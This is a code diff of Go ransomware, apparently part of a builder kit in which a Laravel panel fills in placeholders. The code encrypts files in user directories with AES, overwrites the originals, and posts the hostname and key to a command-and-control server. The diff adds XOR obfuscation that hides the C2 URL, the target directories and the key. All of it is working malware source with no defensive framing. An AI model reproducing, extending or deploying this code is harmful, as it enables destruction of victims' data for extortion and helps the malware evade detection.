@@ -12,9 +12,24 @@ import (
 	"net/url"
 )
 
-const C2ServerUrl = "__C2_SERVER_URL__"
-const TargetDirsString = "__TARGET_DIRECTORIES__"
+// المتغيرات المشفرة (يتم استبدالها من Laravel)
+var EncC2ServerUrl = __C2_SERVER_URL__
+var EncTargetDirs = __TARGET_DIRECTORIES__
+var EncAesKey = __ENCRYPTED_AES_KEY__
 
+// مفتاح فك تشفير XOR
+const XorKey byte = __XOR_KEY__
+
+// دالة فك تشفير XOR في الذاكرة
+func decryptXOR(encrypted []byte, key byte) string {
+	decrypted := make([]byte, len(encrypted))
+	for i := 0; i < len(encrypted); i++ {
+		decrypted[i] = encrypted[i] ^ key
+	}
+	return string(decrypted)
+}
+
+// دالة تشفير الملفات (AES)
 func encryptData(plainText []byte, key []byte) ([]byte, error) {
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -31,14 +46,14 @@ func encryptData(plainText []byte, key []byte) ([]byte, error) {
 	return gcm.Seal(nonce, nonce, plainText, nil), nil
 }
 
-func processFiles() {
-	key := []byte("0123456789abcdef0123456789abcdef") 
+// معالجة الملفات
+func processFiles(targetDirsString string, aesKey []byte) {
 	userProfile := os.Getenv("USERPROFILE")
 	if userProfile == "" {
 		userProfile = "C:\\Users\\Default"
 	}
 
-	targetDirectories := strings.Split(TargetDirsString, ",")
+	targetDirectories := strings.Split(targetDirsString, ",")
 
 	for _, dirName := range targetDirectories {
 		dirName = strings.TrimSpace(dirName)
@@ -58,7 +73,7 @@ func processFiles() {
 					return nil
 				}
 
-				encrypted, err := encryptData(data, key)
+				encrypted, err := encryptData(data, aesKey)
 				if err == nil {
 					os.WriteFile(path, encrypted, 0644)
 				}
@@ -68,7 +83,8 @@ func processFiles() {
 	}
 }
 
-func reportBack() {
+// إرسال التقرير
+func reportBack(c2Url string, aesKey string) {
 	hostname, err := os.Hostname()
 	if err != nil {
 		hostname = "Unknown-PC"
@@ -78,17 +94,26 @@ func reportBack() {
 	data.Set("hostname", hostname)
 	data.Set("ip_address", "192.168.1.100")
 	data.Set("os", "Windows")
-	data.Set("encryption_key", "0123456789abcdef0123456789abcdef")
+	data.Set("encryption_key", aesKey)
 	data.Set("encryption_type", "AES")
 	data.Set("status", "encrypted")
 
-	resp, err := http.PostForm(C2ServerUrl, data)
+	resp, err := http.PostForm(c2Url, data)
 	if err == nil {
 		resp.Body.Close()
 	}
 }
 
 func main() {
-	processFiles()
-	reportBack()
+	// فك تشفير النصوص في الذاكرة
+	realC2Url := decryptXOR(EncC2ServerUrl, XorKey)
+	realTargetDirs := decryptXOR(EncTargetDirs, XorKey)
+	realAesKeyStr := decryptXOR(EncAesKey, XorKey)
+
+	// تحويل مفتاح AES إلى بايتات
+	aesKeyBytes := []byte(realAesKeyStr)
+
+	// تنفيذ المهام
+	processFiles(realTargetDirs, aesKeyBytes)
+	reportBack(realC2Url, realAesKeyStr)
 }
